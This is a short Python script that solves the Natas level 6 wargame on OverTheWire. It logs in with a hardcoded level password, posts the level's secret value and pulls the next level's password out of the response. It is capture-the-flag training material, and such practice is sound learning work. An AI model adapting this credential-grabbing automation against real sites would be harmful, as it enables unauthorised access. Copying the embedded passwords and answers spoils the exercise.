
#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = '0RoJwHdSKWFTYR5WuiAewauSuNaBXned'

url = 'http://%s.natas.labs.overthewire.org/' % username

try:
    session = requests.Session()
    response = session.post(url, data={"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}, auth=(username, password))
    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas7
    matches = re.findall(r'natas7 is (.*)', content)

    if matches:
        password_natas7 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas7:", password_natas7)
    else:
        print("Password for natas7 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
